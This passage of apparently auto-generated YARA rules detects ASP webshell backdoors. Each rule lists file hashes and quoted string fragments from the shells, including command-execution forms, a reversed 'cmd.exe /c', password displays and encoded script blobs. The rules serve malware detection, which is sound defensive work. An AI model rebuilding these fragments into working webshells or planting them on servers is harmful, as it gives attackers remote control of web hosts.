        hash2 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
        hash3 = "26983c20d5800393bac3bb53aba3932b1f4e74024666a95dd250d8d53e92c88c"
     strings:
        $x1 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
        $x2 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
        $x3 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
        $x4 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
        $s5 = "echo\"<hr>Notice: Unpacking need FSO object,all files unpacked will be under target folder,replacing same named!\"" fullword ascii
        $s6 = "rs.Open \"SELECT * FROM dark_temp where id is null\",conn,1,3" fullword ascii
        $s7 = "rs.Open \"select * from dark_temp\",conn,1,1" fullword ascii
        $s8 = "doTd\"Autologin password:\",\"\"" fullword ascii
        $s9 = "echo\"<center><b>Execute Cmd</b><br>\"" fullword ascii
        $s10 = "doTd\"Autologin account:\",\"\"" fullword ascii
        $s11 = "doTd ScriptEngine&\"/\"&ScriptEngineMajorVersion&\".\"&ScriptEngineMinorVersion&\".\"&ScriptEngineBuildVersion,\"\"" fullword ascii
        $s12 = "doTd User.LoginScript,\"\"" fullword ascii
        $s13 = "doTd\"Execute Sql\",\"10%\"" fullword ascii
        $s14 = "echo\" Password:\"" fullword ascii
        $s15 = "echo\"Password is <font color=red>\"&strPass&\"</font> ^_^\"" fullword ascii
        $s16 = "doTd\"User loginscript\",\"\"" fullword ascii
        $s17 = "doTd\"Temp domain port\",\"\"" fullword ascii
        $s18 = "doTd\"Last login\",\"\"" fullword ascii
        $s19 = "doTd\"Password never expire\",\"\"" fullword ascii
        $s20 = "doTd\"Target\",\"10%\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _1d9b78b5b14b821139541cc0deb4cbbd994ce157_4f216890e1909148a1a8fa78af4fc913eb9645ca_788928ae87551f286d189e163e55410acbb90a64__32
{
     meta:
        description = "asp - from files 1d9b78b5b14b821139541cc0deb4cbbd994ce157.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
        hash2 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
        hash3 = "7d72ed0ef1b497619f12bc962512061d131c96cf9bcedd4a9a4345490e0a088c"
        hash4 = "37cc3a33ec32f5524239f27dae8343dbcaed4d128ac72c6871edc5b742566384"
        hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
     strings:
        $s1 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Fil.name" fullword ascii
        $s2 = "Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)" fullword ascii
        $s3 = "Call Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")" fullword ascii
        $s4 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
        $s5 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
        $s6 = "if success then  gMsg=gMsg & \"<font color=blue>uploaded</font>\" else gMsg = gMsg & \"<font color=red>failed!</font>\"" fullword ascii
        $s7 = "llngEnd = InStrB(llngStart + 1, mbinData, mstrDelimiter) - 2" fullword ascii
        $s8 = "Response.AddHeader \"Content-Length\", Fil.Size" fullword ascii
        $s9 = "targetPath=objUpload.Fields(\"folder\").Value" fullword ascii
        $s10 = "ParseContentType = Trim(CStrU(MidB(pbinChunk, llngStart, llngLength)))" fullword ascii
        $s11 = "Response.contenttype=\"application/force-download\"" fullword ascii
        $s12 = "gMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & name & \" (\" & FormatNumber(size,0) & \" bytes): \"" fullword ascii
        $s13 = "lbinBuffer = lobjRs.Fields(\"BinaryData\").GetChunk(llngLength)" fullword ascii
        $s14 = "FileDir = Mid(pstrPath, 1, InStrRev(pstrPath, \"\\\") - 1)" fullword ascii
        $s15 = "mstrDelimiter = MidB(mbinData, 1, InStrB(1, mbinData, CRLF) - 1)" fullword ascii
        $s16 = "path=addslash(targetPath) & name" fullword ascii
        $s17 = "Private Function ParseContentType(ByRef pbinChunk)" fullword ascii
        $s18 = "If llngIndex > mlngCount - 1 Or llngIndex < 0 Then" fullword ascii
        $s19 = "lstrContentType = ParseContentType(pbinChunk)" fullword ascii
        $s20 = "Call AddField(lstrName, lstrFileName, lstrContentType, lstrValue, lbinData)" fullword ascii
     condition:
        ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _27a020c5bc0dbabe889f436271df129627b02196_4f806f9e22e591aa6d317ab1d6413e4ab4fcef21_33
{
     meta:
        description = "asp - from files 27a020c5bc0dbabe889f436271df129627b02196.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6038f0600baf121cef39c997a296fddac8a67f0d1c24fc4478451d11496ecdb7"
        hash2 = "9b55fdf12b3c5dd5b6c164aa487337944330557b08218e413759df7ba596a872"
     strings:
        $s1 = "mYcEtk^DKdK0Oc(tSC:KhE#@#@&8RKwnU,JMAPJBPJ4OOw=zJF+G Tc! F=EPLPWOawW.O,[~JJ\\|?^4Eslm4+M&Eal[:bx&dyJ~,PD!+~,EE~,Jr@#@&4 d" fullword ascii
        $s2 = "4dwp[U8kwiLU4kwiLU8/ai,JlL8E@!kWDmh+,/.^{Y+dOcldwX~Sk[Dt{&!ZP4nkTtO'8!T@*@!zk6.ls+@*LU8/aiLx8/2ILx8/aIP@!z^n" fullword ascii
        $s3 = "lDnr(LnmD`68:`&BT#*P@#@&/ ZK:al^Y9CDl8lknPrn.G7kNn.{HrmMGkWWDRx+Ycrd3f~R*RZi9CDlPUGEMm+{E'nmY4[E~K.K\\rN" fullword ascii
        $s4 = ".-! ZRZR!-J,'P6Y2wKDO~LPJ-RF-FuZE~[,\\(Z.SW~LPEO:trAxC8^+'TE,[~\\(/MSW,[,JP:}}F+H'EPLP-8;DS6@#@&" fullword ascii
        $s5 = "ls+'EEE~YHwn'Etr[9+xE~k9'B!v~\\mV!+xBE'!/nDLEB@*@!&O9@*J@#@&N4E@!bUaEO,xm:+{BavPDX2+{B4r9N+" fullword ascii
        $s6 = "'DtnnCO4P-l^;+{JEE,[PuOsV3x1G9+cU+M\\+MRtCwhlOtvJ E*#PL~J'FRzjK(rJEPdk\"n{%T@*rlL(PE@!bxw;O,Yzw" fullword ascii
        $s7 = "D d!4:rOv#IBB*Z!T*ir@#@&N4r@!zkm.kaY@*E@#@&mmd+, @#@&dnY,4{?nD-nMR/D" fullword ascii
        $s8 = "UB,k[xE?jC^DkGxE~7ls!+{B E@*@!&0KDh@*r@#@&%(J@!k^DbwY,sCxTEmon'v%m\\C/1.kaYv@*r@#@&%8rNGm!h" fullword ascii
        $s9 = "anm,J,[~mh[,[~\\(/Dd0~',;ErO@#@&d+D~k+dkkKx`r4rb'(@#@&L(J@!WKD:,h+DtW9xvwK/DB~xCh" fullword ascii
        $s10 = "[~q6@#@&2UN~o!x^YbGx@#@&d3^+ZO~1bj+,C;Yr}1@#@&Zm/A~Jtlrxt+U;r)Hz(xt2x!cb@#@&Zz?3PE!" fullword ascii
        $s11 = "xPr!3Kr~,J4YO2=z&Fy{RZRT 8)J~',wGDD~LPEJH|?m4EsCm4+.z!wC[skxJdFr~KM;n~,Jr~~JE@#@&l /" fullword ascii
        $s12 = "c+7lsc\"+;;nkY qDns$ErhrJTBJr;xklW+rJbbpJ[14Dv&G*'EJLm4Dcv+bLJC/aaP:+dO,WW" fullword ascii
        $s13 = "xOcl^VRt{U^t!:Cm4+. kE4srYv#irEScZ!Z#IJ@#@&N4E@!JdmMk2O@*J@#@&^m/nP2@#@&/nDP1'?" fullword ascii
        $s14 = "YnM@*E#ir@#@&%4r/nY:khnKEYvvNKmEsnUYcl^V Hmj1t;:m^t" fullword ascii
        $s15 = "'vwKDOv,YXan'Etk9[nxEPbNxB2GMYvP7CV!+xvr[wG.D[EB@*@!JY[@*J@#@&L(J@!rxaEOP" fullword ascii
        $s16 = "sksn,nCY4@#@&P~,P,PP,sU6RtW-+wksn,nlD4[r{4mVE~hlDt@#@&~3^/n@#@&~P,Pj({J@!^n" fullword ascii
        $s17 = "EdnMP[,sWTkxaCd/,[,:OP'~9+sNKhlbx~',;ErO@#@&d+D~k+dkkKx`rmrb'1@#@&L(J@!^" fullword ascii
        $s18 = "'vY4rkRWKDsRY4+`.Vc\\CV!+xO4k/c-l^E+pv@*J=L(J@!W2ObWUP7CV!+xvE@*" fullword ascii
        $s19 = "4k2iLx8/ai~E=L4r@!k6Dlsn~/Mm{Yn/O N/2PSrNDtxfZ!P4nbo4Y{qZ!@*@!zb0Dm:" fullword ascii
        $s20 = "xB,r['EwKDOB~-mV;+{vJLwG.D[Jv@*@!zON@*E@#@&%(J@!kxaED~xm:n'Emv~DXw" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _1687747b3f79f880735ae0f762baa52b03a96c36_3d7cd32d53abc7f39faed133e0a8f95a09932b64_4c9c9d31ceadee0db4bc592d8585d45e5fd634e7__34
{
     meta:
        description = "asp - from files 1687747b3f79f880735ae0f762baa52b03a96c36.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
        hash2 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
        hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
        hash4 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
        hash5 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
        hash6 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
        hash7 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
        hash8 = "6349389d6fab3bf660f74fe4d224aea7b7b74f49546e3713dd4f42d3760c9396"
        hash9 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
        hash10 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
        hash11 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
        hash12 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
        hash13 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
        hash14 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
        hash15 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
        hash16 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $s1 = "<INPUT type=text name=Folder value=\"\"c:\\php\\,d:\\Program Files\\,C:\\Documents and Settings\\All Users\\Documents\\,C:\\recy" ascii
        $s2 = "<TD align=middle><a href=\"&URL&\"?Action=ScFolder&Folder=c:\\recycler\\><b>" fullword ascii
        $s3 = "<INPUT type=text name=Folder value=\"\"c:\\php\\,d:\\Program Files\\,C:\\Documents and Settings\\All Users\\Documents\\,C:\\recy" ascii
        $s4 = "j\" method=Post><TD align=middle><B>System32" fullword ascii
        $s5 = "</B></TD><TD colspan=3>wmpub<TD align=middle><a href=\"&URL&\"?Action=ScFolder&Folder=c:\\wmpub\\><b>" fullword ascii
        $s6 = "case\"Logout\":Session.Contents.Remove(\"kkk\"):Response.Redirect URL" fullword ascii
        $s7 = "j\"<br><TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff><TR><TD colspan=5 class=TBHead>" fullword ascii
        $s8 = "j\"</FORM></TR></TABLE><BR><DIV align=center><FORM Action=?Action=ScFolder method=Post>" fullword ascii
        $s9 = "j\"<meta http-equiv=\"\"refresh\"\" content=\"&Application(request(\"ProFile\")&\"Time\")&\">\"" fullword ascii
        $s10 = "case \"getTerminalInfo\":getTerminalInfo():case \"PageAddToMdb\":PageAddToMdb():case \"ScanPort\":ScanPort():FuncTion MMD():SI=" ascii
        $s11 = ";}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==\"\"CopyFile\"\"){DName = prompt(\"\"" fullword ascii
        $s12 = "form.submit();}else{top.hideform.FName.value = \"\"\"\";}}</script>\"" fullword ascii
        $s13 = "/td></tr><tr align='center'><td id=d><b id=x>Command" fullword ascii
        $s14 = "j\"<br><a href='javascript:history.back()'><br> \" & Err.Description & \"</a><br>\"" fullword ascii
        $s15 = "j\"<input name='c' type='hidden' id='c' value='\"&cmd&\"' size='50'>\"" fullword ascii
        $s16 = "fsoX.GetFile(FileUrl).Attributes=32" fullword ascii
        $s17 = "<TD align=middle><a href=\"&URL&\"?Action=ScFolder&Folder=\"&wwwroot&\"><b>" fullword ascii
        $s18 = "j\"<input name='port' type='hidden' id='port' value='\"&port&\"'></td>\"" fullword ascii
        $s19 = "j\"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>\"" fullword ascii
        $s20 = "j\"<center><form method='post' name='goldsun'>\"" fullword ascii
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _70656f3495e2b3ad391a77d5208eec0fb9e2d931_9b716d5567289aae1881a416fff247eb53cce718_35
{
     meta:
        description = "asp - from files 70656f3495e2b3ad391a77d5208eec0fb9e2d931.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9f7c28ec95d312985066c92cdae09c7854d99680f3248b7c639561a19c1c3566"
        hash2 = "8009a7f38189b6bdc8e8afca6fc2aa27ab1ca09525e36e3664de8436b78cf439"
     strings:
        $s1 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail.com title=\"E-mail G" fullword ascii
        $s2 = "r: #003333; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #993300; scrollbar-arrow-color: #CC3300;}" fullword ascii
        $s3 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: 4px; LETTER-SPACING: 1px; HEIGHT: 27px" fullword ascii
        $s4 = "ls+UQMAAA==^#~@%> - www.infilak.tr.cx</title><%#@~^HAEAAA==@#@&l^DP{PI" fullword ascii
        $s5 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&W8%_KPnc6a+U,JV2Kr~,EJL3slkW.'rJ~,Wl^/+@#@&G4NC:KKRjn" fullword ascii
        $s6 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
        $s7 = "dDRWKDs`Jb/^n:r#@#@&b0~rkV+sxJrPY4nU@#@&kkVn:~x,J[EME@#@&+U[,k0@#@&b0~3^CkW.,',JJ,Y4nx,3slkW.x,D+$;+kYRkn.\\" fullword ascii
        $s8 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
        $s9 = "@!zm@*Pr9LwCAA==^#~@%><title>I.N.F HACKING CENTER - <%=#@~^CAAAAA==2MWm" fullword ascii
        $s10 = "=klasor size=49 value=\"<%=#@~^BgAAAA==V^ldKDjAIAAA==^#~@%>\"> &nbsp; <input type=submit value=\"Kodlar" fullword ascii
        $s11 = "%\" border=0 bgcolor=\"#666666\" cellpadding=1 cellspacing=1><tr><td><center> <%#@~^WQAAAA==@#@&DnkwKx/" fullword ascii
        $s12 = "lank><font face=wingdings color=lime size=4>M</font> </a>&nbsp; <a href=\"?action=help\" title=\"Yard" fullword ascii
        $s13 = "8dwp@!(D@*@!8.@*@!CP4.+6'hCbVYGlslrV(Gs4@$4WD:lbVc^Ws@*\\+4Nr@!Jl@*LU4kwiLU8/aiLx8/2ILx8/aI[" fullword ascii
        $s14 = "P+XY#@#@&.+kwKxd+ AMkO+,VW9VC.@#@&+U[,kWoT4AAA==^#~@%>" fullword ascii
        $s15 = "D7l.kC8^+d`r)nhSmK_5?(/zSmnzP_Jb@#@&gVMAAA==^#~@%><center> <%#@~^UAAAAA==@#@&DnkwKx/" fullword ascii
        $s16 = "FONT-SIZE: 11px; BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: #006699; FONT-FAMILY: Verdana, Helvetica" fullword ascii
        $s17 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
        $s18 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
        $s19 = "<tr><td bgcolor=\"#CCCCCC\" height=359><%#@~^QwAAAA==r6PUKY,k/^+s~',J8lkVCE,Yt" fullword ascii
        $s20 = "FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: red; FONT-FAMILY: Verdana, Helvetica" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule _1687747b3f79f880735ae0f762baa52b03a96c36_732bb60287fd6e3d82ab9dba919aa2a92cea20a7_8266d76ec5105abfe09bb52229370625fa535e47__36
{
     meta:
        description = "asp - from files 1687747b3f79f880735ae0f762baa52b03a96c36.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
        hash2 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
        hash3 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
        hash4 = "3e2d04ccb6e5251902b4202c925e96eac23df35d0adeb5338af7a75b90efaaea"
        hash5 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
        hash6 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
        hash7 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
        hash8 = "ef3241f0ed93797881487fbc4e4da359687f896ef526980a1425fcd51d8519cc"
        hash9 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
        hash10 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $s1 = ",lrUeht(ecalpeR = lrUeht:)1 + )htaPeht(neL ,htaPesu(diM = lrUeht:nehT )htaPeht(esaCL = )))htaPeht(neL ,htaPesu(tfeL(esaCL fI:)" fullword ascii
        $s2 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'12'=eulav 'tropt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropt'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s3 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'85934'=eulav 'tropd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropd'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s4 = ">d=di dt<>'retnec'=ngila rt<>rt/<>dt/<>'\\:C'=eulav 'htapt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'htapt'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s5 = "'sey'=eulav 'tpircsw'=eman 'xobkcehc'=epyt c=ssalc tupni<>'%07:htdiw'=elyts '" fullword ascii
        $s6 = "efasnu" fullword ascii /* reversed goodware string 'unsafe' */
        $s7 = "c/ exe.dmc" fullword ascii /* reversed goodware string 'cmd.exe /c' */
        $s8 = "neddih" fullword ascii /* reversed goodware string 'hidden' */
        $s9 = ">tpircs/<;)(esolc.wodniw;)(daoler.noitacol.renepo.wodniw;)'" fullword ascii
        $s10 = "'=eulav '%29:htdiw'=elyts 'dmc'=eman tupni<llehs.tpircsw>" fullword ascii
        $s11 = "'=eulav 'timbuS'=eman 'timbus'=epyt tupni< >'52'=ezis  'elif'=epyt 'eliFlacoL'=eman tupni<>'04'=ezis '" fullword ascii
        $s12 = "noitisopsid-tnetnoc" fullword ascii /* reversed goodware string 'content-disposition' */
        $s13 = ";xp3:pot-gniddap" fullword ascii /* reversed goodware string 'padding-top:3px;' */
        $s14 = ">ppa=eulav noitpo<>noitpo/<OSF>osf=eulav noitpo<>dohteMeht=eman tceles<>tcAeht=eman bdMoTdda=eulav neddih=epyt tupni<>08=ezis " fullword ascii
        $s15 = ">d=di 'xoBtxeT'=ssalc dekcehc 'dda'=eulav 'oidar'=epyt 'nottuboidar'=eman tupni<>d=di dt<>dt/<" fullword ascii
        $s16 = "htgnel-tnetnoc" fullword ascii /* reversed goodware string 'content-length' */
        $s17 = "eliFlacoL" fullword ascii /* reversed goodware string 'LocalFile' */
        $s18 = ">rb<>'exe.dmc'=eulav 06=ezis 'xdmc'=eman txet=epyt tupni<" fullword ascii
        $s19 = "'=noitca 'tsop'=dohtem 'mroFpU'=eman mrof<>'retnec'=ngila '0'=gnicapsllec '0'=gniddapllec '0'=redrob elbat<>rb<>rb<>rb<" fullword ascii
        $s20 = "htaPoT" fullword ascii /* reversed goodware string 'ToPath' */
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _1687747b3f79f880735ae0f762baa52b03a96c36_a6a5dc815b5e47e6ce6fc67e3a49ebfeed395498_37
{
     meta:
        description = "asp - from files 1687747b3f79f880735ae0f762baa52b03a96c36.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
        hash2 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
     strings:
        $s1 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
        $s2 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
        $s3 = ">->der=roloc tnof<>'emarFeliF'=tegrat '/ukout/rekc4h/moc.pxeyado//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s4 = ":ExeCuTe(ShiSanFun(ShiSan)):" fullword ascii
        $s5 = "---LQS>->'emarFeliF'=tegrat '/lqs/rekc4h/moc.pxeyado//:ptth'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s6 = "execute(shisanfun(\"gnihtoN=DLOF teS" fullword ascii
        $s7 = "Set fsoXX = Server.CreateObject(\"Scripting.FileSystemObject\"):if request(\"DelCon\")=1 then" fullword ascii
        $s8 = "j\"<title>\"&mNametitle&\" - \"&ServerIP&\" </title>\"" fullword ascii
        $s9 = "</center>\":SI=SI&BackUrl:j SI:j Efun&\"\"&serveru&\"&p=\"&serverp&\"'><script>\":End If" fullword ascii
        $s10 = "fig.redlof" fullword ascii /* reversed goodware string 'folder.gif' */
        $s11 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
        $s12 = "j\".cmd{background-color:#000;color:#FFF}\"" fullword ascii
        $s13 = "39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr(10)" fullword ascii
        $s14 = "\"&mNametitle&\"</A><hr><FORM Action='\"&URL&\"' method=Post><INPUT type=Password name=Pass size=22>&nbsp;<input type=submit val" ascii
        $s15 = ">'%001'=htdiw elbat<" fullword ascii /* reversed goodware string '<table width='100%'>' */
        $s16 = "\\\\erehwynAcp\\\\cetnamyS\\\\ataD noitacilppA\\\\sresU llA\\\\sgnitteS dna stnemucoD\\\\:C" fullword ascii
        $s17 = ">rt/<>dt/<>a/<erehwynacP>->'emarFeliF'=tegrat '4erehwynacp=noitcA?'=ferh a<>'22'=thgieh dt<>rt<" fullword ascii
        $s18 = "=di b<>22=thgieh s=di dt<>dt/<>b/<emaneliF>x=di b<>s=di dt<>rt<>retnec=ngila '%001'=htdiw elbat<" fullword ascii
        $s19 = ">'xp4:mottob-gniddap;838383# dilos xp1:redrob'=elyts vid<>retnec=ngila %71=htdiw 01=thgieh dt<" fullword ascii
        $s20 = "0=KOOtidE:1 - VOOtidE = VOOtidE" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _3022b13c0d914ae454a70d7f425a6df4b0f3f026_43328c78e906cddc813382f26f0176a96568cde3_38
{
     meta:
        description = "asp - from files 3022b13c0d914ae454a70d7f425a6df4b0f3f026.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d58b74767174ec3cef064568e6d95b1f15ec7b1d7f7956b1f89d662f07e62b28"
        hash2 = "ac32432ae9ce015add0335d9f1fa08f198193d545f4efccd20965288af14663b"
     strings:
        $s1 = "lAw*U=3:slslVGDx==ALmK~K4+U3w2s=x?a3s1G^W.&0,Ao,k6|'8PPt&0~];+x#]/vk#1G[+vKtS3xUWK'uP;GV&#|3^/+|Sl!b#\"dvkbd+6Y`1W9n`:HJ2" fullword ascii
        $s2 = "PL+@*q,qWPhC=DN@*@!Jmm^@*@!':m1^1WsKDy*P(obLtD'OD,tn8^+@*@!'U@!YlU(x?&Y9@*==~ogOq'Z~YKsG.,x=nhvxbNk &Y wk" fullword ascii
        $s3 = "{Oq@* -l^EnObWx~'?@!GwU({?(?=bWx@*U@!&WaY@*" fullword ascii
        $s4 = "x|mgbHAPb~S2{]d`?Kglh+=b#l@*@!(.V,T@!&@*$P[n?~q#EnLUD?[:1lsSA~$?n~KzA==GIr^jYM`E^sj;bwD)o\\Cd1DW'E%lmP4." fullword ascii
        $s5 = "8UqxUqkwi?=AUN,kjw{Fl3^/+=L+ %)U2xnmK4+U)Ln@*%~q6~nm0|G,?wQxUw~KwGMPrR=bYPwW" fullword ascii
        $s6 = "@!8ZE@*@!D//Z;ZKDxB:$TmGVE+*EPrL4Y'O.,tn4^n@*@!'?@!Dl?&'U(Y9@*==7+orMI/c\\WkYP#GOP\"/bVnPH9KP" fullword ascii
        $s7 = "|Lx8kw?@!zm@*@*=[b[r[?#v=?~ULjYM[U?'j;^YM`=Usj$VjY=oE^/^.bwB%C7l4D" fullword ascii
        $s8 = "cJDDU*b=?$VUsGDhc!+dYch`\"+5.{KDrj$VjY#9(?OMWM:`?+kORw']+$E98UYD?b=bxo{vswmN9B~mns" fullword ascii
        $s9 = "@*D@*@!&YLU@!zO?(xUq==&l?&']]UP?==#FTP:4UY.*@*" fullword ascii
        $s10 = "Dxj5SrJ3GA Fp9mYC,?KED1+{EPLPOlMonObwPLE~r[PaG.YgEsP'JIik+.P&9'^lVnyinCdkhGD9xpJl1W" fullword ascii
        $s11 = "@!&l@*@!4.@*@!zO[@*@!&YM@*r@#@&\"IUJ@!DD@*@!Y9P4+bo4O{B 8v@*@!lP4.n0{BQb^YrG" fullword ascii
        $s12 = "OPw=H+XY|'?@!zDjq{?qM@*==;W!xOP)U9P AKW#KD~]kR2GW,WO`\"dbVn,1GWPqt@*T={ZGE" fullword ascii
        $s13 = "+xEhbYP6l1@*@!6WUm1m^^KD'[^4TmW^@*@!Y9PLU@!Y.j&'jq9@*U#PoH F'T~:WoWM~b===2" fullword ascii
        $s14 = "@!J[=#E@*mon F?~ULnD.[?U'?$Vj.vUU?j;^?Y=o;V^mMk2Y%C7ldD" fullword ascii
        $s15 = "N~q6|l(Vn@*M@*@!&O9@*@!zDv@*@!&DsAs2wD{vaAP^W^W'=@!tDU('UqU#xHWDt" fullword ascii
        $s16 = "@!JC@*@!JY9@*@!zO.@*J@#@&\"]?r@!O.@*@!Y[~4+ro4O{B+8B@*@!l,tMn0{B_b1YrG" fullword ascii
        $s17 = "kLt@*@!DN~[?@!YM?(xUq@*=|@*@!&Y9.LU=??$V?D'?=UL\\CV!+*{ZBPb[Y4)V" fullword ascii
        $s18 = "xvhEPkYz;sjDDh+{v?!Y~Um@*@!rUa[=@!D[UqxUq@*U=JY9@*Uv#v@*@!Z4n13D" fullword ascii
        $s19 = "Pr9+@*@!/azDC4^W.:@*@!.@*@!z0L=@!JY?&xjq#q=?(']]UPjU?|!,K4nDD#@**" fullword ascii
        $s20 = "x+1O`*#Rrb~@*,!,K4+Ul\"Ij`DCDT+OraP[~E=J~[,2KDOgEsP[,Jc RcR R" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

